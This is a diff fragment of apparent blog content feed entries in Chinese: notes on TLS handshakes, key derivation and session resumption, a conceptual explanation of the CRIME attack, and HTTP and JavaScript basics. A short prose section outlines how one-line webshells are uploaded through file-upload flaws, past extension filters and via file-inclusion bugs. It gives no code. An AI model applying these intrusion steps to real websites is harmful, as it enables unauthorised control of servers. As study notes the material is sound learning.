+<li>ChangeCipherSpec：这是一条事件消息编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送（ChangeCipherSpec是一个独立的协议，体现在数据包中就是一个字节的数据，用于告知服务端，客户端已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了）。<br><img src="/2023/07/11/SSL/image-20230711173437747.png" alt="image-20230711173437747"></li>
+<li>Client Finished：客户端握手结束通知。计算前面发送所有内容通过HMAC算法和伪函数PRF计算得出结果，加密后发送。</li>
+<li>Server Finished：服务端握手结束通知。<ol>
+<li>使用私钥解密加密的pre-master值，计算得到协商密钥</li>
+<li>计算之前所有接受信息的hash值，然后解密客户端发送的encrypted_handshake_message，验证数据和密钥的正确性</li>
+<li>发送一个ChangeCipherSpec</li>
+<li>服务端也会使用Session Secret加密一段Finish消息发送给客户端以验证之前通过握手建立起来的加解密通道是否成功</li>
+</ol>
+</li>
+</ol>
+<h3 id="消息验证代码和哈希消息认证码"><a href="#消息验证代码和哈希消息认证码" class="headerlink" title="消息验证代码和哈希消息认证码"></a>消息验证代码和哈希消息认证码</h3><p>当服务器或客户端使用主密钥加密数据时，它还会计算明文数据的校验和（哈希值），这个校验和称为消息验证代码（MAC）。然后在发送之前将MAC包含在加密数据中。密钥用于从数据中生成MAC，以确保传输过程中攻击者无法从数据中生成相同的MAC，故而MAC被称为HMAC（哈希消息认证码）。另一方面，在接收到消息时，解密器将MAC与明文分开，然后用它的密钥计算明文的校验和，并将其与接收到的MAC进行比较，如果匹配，那我们就可以得出结论：数据在传输过程中没有被篡改。</p>
+<h3 id="重要的secret-key"><a href="#重要的secret-key" class="headerlink" title="重要的secret key"></a>重要的secret key</h3><h4 id="pre-master-secret"><a href="#pre-master-secret" class="headerlink" title="pre-master secret"></a>pre-master secret</h4><p>客户端使用RSA或DH等加密算法生成，用来跟客户端和服务器在hello阶段产生的随机数结合在一起生产master secret</p>
+<h4 id="master-sercet"><a href="#master-sercet" class="headerlink" title="master sercet"></a>master sercet</h4><p>通过交换，客户端和服务端都会有pre-master和随机数，二者结合计算出master secret。当完成master_secret计算后，pre_master_scret应该从内存中删除。<strong>避免攻击者获取预备主密钥，如果攻击者获取到了预备主密钥，加上 ClientHello.random 和 ServerHello.random 传输过程中是不加密的，也容易获取，那么攻击者就可以合成主密钥并进一步导出会话密钥，这样整个加密过程就被完全破解了</strong>。</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">master_secret = PRF（pre_master_secret，“<span class="keyword">master</span> <span class="title">secret</span>”，ClientHello.random + ServerHello.random）[<span class="number">0</span>..<span class="number">47</span>];</span><br></pre></td></tr></table></figure>
+<h3 id="预备主密钥"><a href="#预备主密钥" class="headerlink" title="预备主密钥"></a>预备主密钥</h3><p>RSA：client会生成一个48字节的预备主密钥，其中前两个字节是ProtocolVersion，后46字节是随机数，用 Server 的公钥加密之后通过 Client Key Exchange 子消息发给 Server，Server 用私钥来解密。</p>
+<p>DH：预备主密钥是双方通过椭圆曲线算法生成的，双方各自生成临时公私钥对，保留私钥，将公钥发给对方，然后就可以用自己的私钥以及对方的公钥通过椭圆曲线算法来生成预备主密钥，预备主密钥长度取决于 DH/ECDH 算法公钥。</p>
+<h3 id="主密钥"><a href="#主密钥" class="headerlink" title="主密钥"></a>主密钥</h3><p>主密钥是由预备主密钥、ClientHello random 和 ServerHello random 通过 PRF 函数生成的。<strong>主密钥长度是 48 字节</strong>。</p>
+<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>当RSA被用于身份认证和密钥交换时，Client 会产生一个 48 字节的 pre_master_secret，用 Server 的公钥加密，然后发送给 Server。Server 用它自己的私钥解密 pre_master_secret。然后双方按照前述方法将 pre_master_secret转换为 master_secret。</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">struct &#123;</span><br><span class="line">    ProtocolVersion client_version<span class="comment">;</span></span><br><span class="line">    opaque random[<span class="number">46</span>]<span class="comment">;</span></span><br><span class="line">&#125; PreMasterSecret<span class="comment">; </span></span><br></pre></td></tr></table></figure>
+<h4 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h4><p>一个传统的 Diffie-Hellman 计算需要被执行。协商出来的密钥（Z）会被用做pre_master_secret，并按照前述方法将其转换为 master_secret。在被用做pre_master_secret之前，Z 开头所有的 0 位都会被压缩。</p>
+<p>注：Diffie-Hellman 参数由 Server 指定，可能是临时的也可能包含在 Server 的证书中。</p>
+<h4 id="增强型主密钥"><a href="#增强型主密钥" class="headerlink" title="增强型主密钥"></a>增强型主密钥</h4><p> 如果ClientHello 的扩展中携带了 extended_master_secret 扩展，这个扩展标识 Client 和 Server 使用增强型主密钥计算方式。Server 在 ServerHello 中响应该扩展，返回了一个空的 extended_master_secret 扩展，表明会使用增强型主密钥计算方式。</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">master_secret</span> = PRF(pre_master_secret, <span class="string">&quot;extended master secret&quot;</span>, session_hash)[<span class="number">0</span>..<span class="number">47</span>]<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>“extended master secret” 替代了 “master secret”</li>
+<li>session_hash 替代了 ClientHello.random + ServerHello.random</li>
+</ul>
+<p>session_hash取决于 Client 和 Server 的密码套件，密钥交换信息和证书和”ClientHello.random” 和 “ServerHello.random” 的握手日志</p>
+<h4 id="会话密钥"><a href="#会话密钥" class="headerlink" title="会话密钥"></a>会话密钥</h4><p>用于TLS记录层加密。</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123; <span class="literal">null</span>(<span class="number">0</span>), (<span class="number">255</span>) &#125; CompressionMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123; server, client &#125; ConnectionEnd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123; tls_prf_sha256 &#125; PRFAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123; <span class="literal">null</span>, rc4, <span class="number">3</span>des, aes &#125; BulkCipherAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123; stream, block, aead &#125; CipherType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123; <span class="literal">null</span>, hmac_md5, hmac_sha1, hmac_sha256, hmac_sha384,</span><br><span class="line">  hmac_sha512&#125; MACAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Other values may be added to the algorithms specified in</span></span><br><span class="line"><span class="comment">CompressionMethod, PRFAlgorithm, BulkCipherAlgorithm, and</span></span><br><span class="line"><span class="comment">MACAlgorithm. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    ConnectionEnd          entity;</span><br><span class="line">    PRFAlgorithm           prf_algorithm;</span><br><span class="line">    BulkCipherAlgorithm    bulk_cipher_algorithm;</span><br><span class="line">    CipherType             cipher_type;</span><br><span class="line">    <span class="keyword">uint8</span>                  enc_key_length;</span><br><span class="line">    <span class="keyword">uint8</span>                  block_length;</span><br><span class="line">    <span class="keyword">uint8</span>                  fixed_iv_length;</span><br><span class="line">    <span class="keyword">uint8</span>                  record_iv_length;</span><br><span class="line">    MACAlgorithm           mac_algorithm;</span><br><span class="line">    <span class="keyword">uint8</span>                  mac_length;</span><br><span class="line">    <span class="keyword">uint8</span>                  mac_key_length;</span><br><span class="line">    CompressionMethod      compression_algorithm;</span><br><span class="line">    opaque                 master_secret[<span class="number">48</span>];</span><br><span class="line">    opaque                 client_random[<span class="number">32</span>];</span><br><span class="line">    opaque                 server_random[<span class="number">32</span>];</span><br><span class="line">&#125; SecurityParameters;</span><br></pre></td></tr></table></figure>
+<p>主密钥被扩张为一个安全字节序列，它被分割为一个 client_write_MAC_key，一个 server_write_MAC_key，一个 client_write_key，一个 server_write_key。它们中的每一个都是从字节序列中以上述顺序生成。未使用的值是空。一些AEAD加密可能会额外需要一个 client_write_IV 和一个 server_write_IV。生成密钥和 MAC 密钥时，主密钥被用作一个熵源。所以会话密钥(密钥块)的长度和个数取决于协商出来的密码套件，更准确的说是取决于加密参数 SecurityParameters，需要使用 PRF 函数扩展出足够长的密钥块</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">key_block = PRF(<span class="name">SecurityParameters</span>.master_secret,</span><br><span class="line">                      <span class="string">&quot;key expansion&quot;</span>,</span><br><span class="line">                      SecurityParameters.server_random +</span><br><span class="line">                      SecurityParameters.client_random)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，会话密钥和主密钥使用PRF的三个入参都不一样，PRF(secret, label, seed)：主密钥是 <code>(pre_master_secret, &quot;master secret&quot;, ClientHello.random + ServerHello.random)</code>，会话密钥是 <code>(SecurityParameters.master_secret, &quot;key expansion&quot;, SecurityParameters.server_random + SecurityParameters.client_random)</code></p>
+<p><strong>seed 顺序有变化，Client 和 Server 随机数的组合顺序会调换</strong>。</p>
+<p>产生足够的输出，然后会生成六个需要的参数</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">client_write_MAC_key<span class="selector-attr">[SecurityParameters.mac_key_length]</span></span><br><span class="line">server_write_MAC_key<span class="selector-attr">[SecurityParameters.mac_key_length]</span></span><br><span class="line">client_write_key<span class="selector-attr">[SecurityParameters.enc_key_length]</span></span><br><span class="line">server_write_key<span class="selector-attr">[SecurityParameters.enc_key_length]</span></span><br><span class="line">client_write_IV<span class="selector-attr">[SecurityParameters.fixed_iv_length]</span></span><br><span class="line">server_write_IV<span class="selector-attr">[SecurityParameters.fixed_iv_length]</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/11/SSL/1\SSL\image-20230712094834488.png" alt="image-20230712094834488"></p>
+<h4 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h4><p>TLS 记录层使用一个有密钥的信息验证码(MAC)来保护信息的完整性。密码算法族使用了一个被称为HMAC（在[HMAC]中描述）的 MAC 算法，它基于一个 hash 函数。如果必要的话其它密码算法族可以定义它们自己的 MAC 算法。</p>
+<p>此外，为了进行密钥生成或验证，需要一个 MAC 算法对数据块进行扩展以增加机密性。这个伪随机函数（PRF）将机密信息（secret），种子和身份标签作为输入，并产生任意长度的输出。</p>
+<p>基于 HMAC 定义了一个 PRF 函数。这个使用 SHA-256 hash 函数的 PRF 函数被用于所有的密码算法套件。新的密码算法套件必须显式指定一个 PRF，通常应该使用 SHA-256 或更强的标准 hash 算法与 TLS PRF 一同使用。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"># 数据扩展函数</span><br><span class="line">      <span class="constructor">P_hash(<span class="params">secret</span>, <span class="params">seed</span>)</span> = <span class="constructor">HMAC_hash(<span class="params">secret</span>, A(1)</span> + seed) +</span><br><span class="line">                             <span class="constructor">HMAC_hash(<span class="params">secret</span>, A(2)</span> + seed) +</span><br><span class="line">                             <span class="constructor">HMAC_hash(<span class="params">secret</span>, A(3)</span> + seed) +<span class="operator"> ...</span></span><br><span class="line"><span class="operator">                             </span></span><br><span class="line"><span class="operator"></span># <span class="constructor">A()</span>定义</span><br><span class="line">              <span class="constructor">A(0)</span> = seed</span><br><span class="line">              <span class="constructor">A(<span class="params">i</span>)</span> = <span class="constructor">HMAC_hash(<span class="params">secret</span>, A(<span class="params">i</span>-1)</span>)</span><br><span class="line">              </span><br><span class="line"># PRF</span><br><span class="line">	<span class="constructor">PRF(<span class="params">secret</span>, <span class="params">label</span>, <span class="params">seed</span>)</span> = P_&lt;hash&gt;(secret, label + seed)</span><br></pre></td></tr></table></figure>
+<p>必要时 P_hash 可以被多次迭代，以产生所需数量的数据。例如，如果 P_SHA256 被用于产生 80 字节的数据，它应该被迭代 3 次(通过 A(3))，SHA_256 每次输出 32 字节(256 bit)，迭代 3 次才能产生 96 字节的输出数据，最终迭代产生的最后 16 字节会被丢弃，留下 80 字节作为输出数据。</p>
+<p>label 是一个 ASCII 字符串。它应该以严格地按照它被给出的内容进行处理，不包含一个长度字节或结尾添加的空字符。例如，label “slithy toves” 应该通过 hash 下列字节的方式被处理：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">73</span> <span class="number">6</span>C <span class="number">69</span> <span class="number">74</span> <span class="number">68</span> <span class="number">79</span> <span class="number">20</span> <span class="number">74</span> <span class="number">6</span>F <span class="number">76</span> <span class="number">65</span> <span class="number">73</span></span><br></pre></td></tr></table></figure>
+<p>上述数据是字符串 “slithy toves” 的十六进制格式。</p>
+<p><img src="/2023/07/11/SSL/image-20230711233504381.png" alt="image-20230711233504381"></p>
+<p>在 TLS 1.0 和 TLS 1.1 中，调用了两次 P_HASH，一次是 MD5 一次是 SHA1，两次的结果进行异或得到最后的结果。</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">r1</span> <span class="operator">=</span> P_MD5(...)<span class="comment">;</span></span><br><span class="line"><span class="attribute">r2</span> <span class="operator">=</span> P_SHA1(...)<span class="comment">;</span></span><br><span class="line"><span class="attribute">r</span>  <span class="operator">=</span> r1 xor r2</span><br></pre></td></tr></table></figure>
+<h3 id="SSL会话恢复"><a href="#SSL会话恢复" class="headerlink" title="SSL会话恢复"></a>SSL会话恢复</h3><p><img src="/2023/07/11/SSL/1\SSL\image-20230712095754804.png" alt="image-20230712095754804" style="zoom:67%;"></p>
+<p>TLS有两类会话缓存机制</p>
+<ul>
+<li>会话标识 session ID: 由服务器端支持，协议中的标准字段，因此基本所有服务器都支持，服务器端保存会话ID以及协商的通信信息，Nginx 中1M 内存约可以保存4000个 session ID 机器相关信息，占用服务器资源较多;</li>
+<li>会话记录 session ticket :t需要服务器和客户端都支持，属于一个扩展字段，支持范围约60%(无可靠统计与来源)，将协商的通信信息加密之后发送给客户端保存，密钥只有服务器知道，占用服务器资源很少。</li>
+</ul>
+<h4 id="Session-ID"><a href="#Session-ID" class="headerlink" title="Session ID"></a>Session ID</h4><p>如果客户端和服务器之间曾经建立了连接，服务器会在握手成功后返回 session ID，并保存对应的通信参数在服务器中;<br>如果客户端再次需要和该服务器建立连接，则在 client_hello 中 session ID 中携带记录的信息，发送给服务器;<br>服务器根据收到的 session ID 检索缓存记录，如果没有检索到货缓存过期，则按照正常的握手过程进行;<br>如果检索到对应的缓存记录，则返回 change_cipher_spec 与 encrypted_handshake_message 信息，两个信息作用类似，encrypted_handshake_message 是到当前的通信参数与 master_secret的hash 值;<br>如果客户端能够验证通过服务器加密数据，则客户端同样发送 change_cipher_spec 与 encrypted_handshake_message 信息;<br>服务器验证数据通过，则握手建立成功，开始进行正常的加密数据通信。</p>
+<h4 id="Session-ticket"><a href="#Session-ticket" class="headerlink" title="Session ticket"></a>Session ticket</h4><p>如果客户端和服务器之间曾经建立了连接，服务器会在 new_session_ticket 数据中携带加密的 session_ticket 信息，客户端保存;<br>如果客户端再次需要和该服务器建立连接，则在 client_hello 中扩展字段 session_ticket 中携带加密信息，一起发送给服务器;<br>服务器解密 sesssion_ticket 数据，如果能够解密失败，则按照正常的握手过程进行;<br>如果解密成功，则返回 change_cipher_spec 与 encrypted_handshake_message 信息，两个信息作用与 session ID 中类似;<br>如果客户端能够验证通过服务器加密数据，则客户端同样发送 change_cipher_spec与encrypted_handshake_message 信息;<br>服务器验证数据通过，则握手建立成功，开始进行正常的加密数据通信。</p>
+<h4 id="应用数据传输"><a href="#应用数据传输" class="headerlink" title="应用数据传输"></a>应用数据传输</h4><p>在所有的握手阶段都完成之后，就可以开始传送应用数据了。应用数据在传输之前，首先要附加上MAC secret，然后再对这个数据包使用write encryption key进行加密。在服务端收到密文之后，使用Client write encryption key进行解密，客户端收到服务端的数据之后使用Server write encryption key进行解密，然后使用各自的write MAC key对数据的完整性包括是否被串改进行验证。</p>
+<h2 id="CRIME攻击"><a href="#CRIME攻击" class="headerlink" title="CRIME攻击"></a>CRIME攻击</h2><p>针对于HTTPS的攻击，多存在于中间人攻击的环境，攻击者要先能监听用户和网站之间的流量。</p>
+<p>HTTP/TLS一般都启用了压缩算法，通过改变请求正文，对比被压缩后的密文长度，可以破解出某些信息。</p>
+<p>HTTP压缩采用了Deflate算法。该算法可以将重复出现的字符串以一个实例的形式存储在HTML文件之中，并以此来缩小数据流所占的空间。当代码需要使用这一字符串时，系统会自动用一个指针来进行索引，这样就可以最大程度地节省空间了。一般而言，如果一个数据流中存在大量的重复字符串，那么这也就意味着在经过了压缩处理之后，可以显著地减少数据所占的空间。值得注意的是，Deflate算法是同时使用了LZ77算法与哈夫曼编码（Huffman Coding）的一个无损数据压缩算法。</p>
+<p>CRIME通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，能够解密会话Cookie，主要针对TLS压缩。</p>
+<p>Javascript代码尝试一位一位的暴力破解Cookie的值。中间人组件能够观察到每次破解请求和响应的密文，寻找不同，一旦发现了一个，他会和执行破解的Javascript通信并继续破解下一位。</p>
+<p><img src="/2023/07/11/SSL/1\SSL\image-20230712101034337.png" alt="image-20230712101034337"></p>
+<p>在secret=后面加上各种字符进行推测，当匹配到X的时候，密文因为被压缩会变的更短，就得到了第一位的X。依次往下推，就可以得到完整的cookie。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HTML基础</title>
+    <url>/2023/07/11/HTML%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>HTML基础-js、ajax、php、jquery等</p>
+<span id="more"></span>
+<h2 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h2><h3 id="HTTP传输原理"><a href="#HTTP传输原理" class="headerlink" title="HTTP传输原理"></a>HTTP传输原理</h3><h4 id="HTTP1-0"><a href="#HTTP1-0" class="headerlink" title="HTTP1.0"></a>HTTP1.0</h4><p>采用文本方式进行数据传输，允许cs之间传输任意格式数据，每次连接只能处理一个请求，并且服务器处理完请求得到客户端的应答后断开连接。</p>
+<p>特点：简单快速，无连接，无状态<br>所以后来引入了cookie机制</p>
+<h4 id="HTTP1-1"><a href="#HTTP1-1" class="headerlink" title="HTTP1.1"></a>HTTP1.1</h4><p>持久性通信，只要客户端和服务器任意一方没有提出断开TCP请求就会一直保持连接，并且支持HTTP请求</p>
+<h4 id="HTTP2-0"><a href="#HTTP2-0" class="headerlink" title="HTTP2.0"></a>HTTP2.0</h4><p>采用二进制数据格式，一个HTTP连接可以实现多个请求响应，服务器可以主动推送消息到客户端</p>
+<h3 id="HTTPS加密传输"><a href="#HTTPS加密传输" class="headerlink" title="HTTPS加密传输"></a>HTTPS加密传输</h3><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><p>第一次传输将密钥发给客户，特点是传输速度快，但是被劫持或获取密钥后就无了</p>
+<h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><p>第一次通过非对称加密，即将对称加密的密钥发送给目标，通过第一次发送的密钥建立连接，即内容传输的加密是对称加密，证书验证阶段才是非对称加密</p>
+<p>容易中间人劫持</p>
+<h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h4><p>向CA机构申请个证书，然后通过数字签名将密钥发送给目标，然后目标通过密钥进行返回数据数字签名存在校对</p>
+<h3 id="CDN内容分发网络"><a href="#CDN内容分发网络" class="headerlink" title="CDN内容分发网络"></a>CDN内容分发网络</h3><p>就是将原站内容发送到全国所有的节点，让用户从而访问最近的节点，减少服务器的流量。<br>通过挂vpn用国外的IP访问目标主机，如果和实际ip访问目标的IP不一样，那便存在CDN。</p>
+<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>文件本意告诉搜索引擎什么网页不可以爬，但是获取shell连接后可以看到该文件会造成信息泄露</p>
+<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><h3 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h3><p>正向代理隐藏的是客户端，反向代理隐藏的是服务器<br>正向代理（客户端是被代理人）<br>客户端通过代理服务器访问目标服务器，代理服务器接过客户端的请求并转发给目标服务器，这时代理服务器对于目标服务器来说就是客户端，并不知道真实的客户端是谁（隐藏了真实请求的客户端）<br>反向代理（服务端是被代理人）<br>客户端发送请求给代理服务器，代理服务器接过请求，并在众多服务器中有策略地进行选择一个合适的服务器，并转发请求给这个实际工作的业务服务器，然后收到响应返回给客户端，这时对于客户端，并不知道真实处理工作的服务器是谁（隐藏了真实的服务端）</p>
+<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>代理服务器和抓包工具（比如Fiddler）都能看到http request中的数据。 如果我们发送的请求中有敏感数据，比如用户名，密码，信用卡号码。这些信息都会被代理服务器看到。所以非常危险。 所以我们一般都是用HTTPS来加密Http请求，这样代理服务器就看不到里面的数据了</p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用文件上传漏洞往目标网站中上传木马，通过菜刀、antsword、冰蝎等可以连接和控制整个网站目录。</p>
+<p>不过成功连接需要木马文件成功执行，一般网站对php、asp、jsp等文件上传设置了限制，可以通过更改后缀名进行绕过或使用图片马、zip马等绕过，主要利用了文件上传的伪协议。</p>
+<p>但是这样想要成功连接需要以对应的脚本解析方式来解析木马文件，这要求网站存在文件包含漏洞或中间件解析漏洞。</p>
+<h3 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h3><ul>
+<li>木马成功上传（可以使用免杀技术）</li>
+<li>通过敏感信息泄露如phpinfo获取网站绝对路径</li>
+<li>存在文件包含等漏洞使得上传的木马可以正确解析</li>
+</ul>
+<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>浏览器</p>
+<ul>
+<li>HTML内容</li>
+<li>CSS框架</li>
+<li>JS脚本 动态交互</li>
+</ul>
+<p>软件</p>
+<ul>
+<li>渲染出页面，解析前端代码</li>
+</ul>
+<h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>直接在服务器执行，无法直接看到</p>
+<h3 id="HTTP原理"><a href="#HTTP原理" class="headerlink" title="HTTP原理"></a>HTTP原理</h3><p>浏览器给中间件发送请求，中间件发送给后端，后端进行交互，后端返回给中间件，中间件返回给浏览器，浏览器进行解析前端代码，渲染出页面</p>
+<h2 id="计算机硬件"><a href="#计算机硬件" class="headerlink" title="计算机硬件"></a>计算机硬件</h2><p>程序运行先预存到内存当中，然后以二进制进行运行，分为指令代码和数据，而指令在代码段，数据和全局变量在数据段，堆自己创建空间，栈存放局部变量，cpu指针到预存到内存的开始段，开始运行</p>
+<h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>指令</p>
+<h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>数据和全局变量</p>
+<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>空间</p>
+<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>局部变量</p>
+<h2 id="JS脚本"><a href="#JS脚本" class="headerlink" title="JS脚本"></a>JS脚本</h2><p>Object，一切皆为对象<br>js是基于对象的编程语言</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 行内应用</span></span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;button&quot;</span> <span class="attribute">value</span>=<span class="string">&quot;button&quot;</span> <span class="attribute">onclick</span>=<span class="string">&quot;alert(&#x27;@ka1i&#x27;)&quot;</span> </span><br><span class="line"><span class="comment"># 内部应用</span></span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;alert(&#x27;@ka1i&#x27;)&lt;K/script&gt;</span><br><span class="line"><span class="comment"># 外部应用</span></span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;hello.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><p>第一个字符必须以字母、下划线为首<br>变量名当中不能包含空格、标点符号（$除外）<br>变量名区分大小写，不能使用保留字、关键字</p>
+<h4 id="var、let、const"><a href="#var、let、const" class="headerlink" title="var、let、const"></a>var、let、const</h4><p><strong>var声明的变量会挂载在window上，而let和const声明的变量不会</strong></p>
+<p><img src="/2023/07/11/HTML%E5%9F%BA%E7%A1%80/2\HTML基础\image-20230713095917041.png" alt="image-20230713095917041"></p>
+<p>var在编译过程中可以改变，const和let无法改变会报错。</p>
+<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> akali = <span class="string">&quot;lovekaliforever&quot;</span></span><br><span class="line"><span class="meta"># 索引</span></span><br><span class="line">akali[x]</span><br></pre></td></tr></table></figure>
+<h3 id="内容输出格式"><a href="#内容输出格式" class="headerlink" title="内容输出格式"></a>内容输出格式</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alert</span>();弹出一个警告框</span><br><span class="line">document<span class="selector-class">.write</span>();文档写</span><br><span class="line">console<span class="selector-class">.log</span>();控制台输出内容</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/11/HTML%E5%9F%BA%E7%A1%80/2\HTML基础\image-20230712111302798.png" alt="image-20230712111302798"></p>
+<h3 id="比较符、算术符、逻辑运算符"><a href="#比较符、算术符、逻辑运算符" class="headerlink" title="比较符、算术符、逻辑运算符"></a>比较符、算术符、逻辑运算符</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># 比较符</span><br><span class="line"><span class="section">== 相等运算符，用于确定值是否相等</span></span><br><span class="line"><span class="section">=== 全等于运算符，需要值和类型全部相等</span></span><br><span class="line">1 == &quot;1&quot;   output:true</span><br><span class="line">1 === &quot;1&quot;  output:false</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 算术符</span></span><br><span class="line">+、-、x、/、%</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">逻辑运算符</span><br><span class="line"><span class="meta">&amp;&amp; 与运算，就是需要两边全部都对，才显示为真，负责为假</span></span><br><span class="line"><span class="string">|| 或运算，就是两边只要有一边为对，即显示为真</span></span><br><span class="line">! 非运算，就是把真变成假，假变成真</span><br></pre></td></tr></table></figure>
+<h3 id="选择控制"><a href="#选择控制" class="headerlink" title="选择控制"></a>选择控制</h3><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>控制</span><br><span class="line">   <span class="keyword">var</span> a=<span class="number">0</span>;</span><br><span class="line">   	<span class="keyword">if</span> (a==<span class="number">0</span>) &#123;</span><br><span class="line">   		alert(<span class="string">&#x27;这是真&#x27;</span>);</span><br><span class="line">   	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">   		alert(<span class="string">&#x27;这是假&#x27;</span>);</span><br><span class="line">   	&#125;</span><br><span class="line"><span class="keyword">switch</span>控制</span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (i)&#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">           alert(<span class="number">0</span>);</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">           alert(<span class="number">1</span>);</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">           alert(<span class="string">&quot;其他&quot;</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">	<span class="built_in">console</span>.<span class="built_in">log</span>(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>循环</span><br><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">7</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.<span class="built_in">log</span>(i) ;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
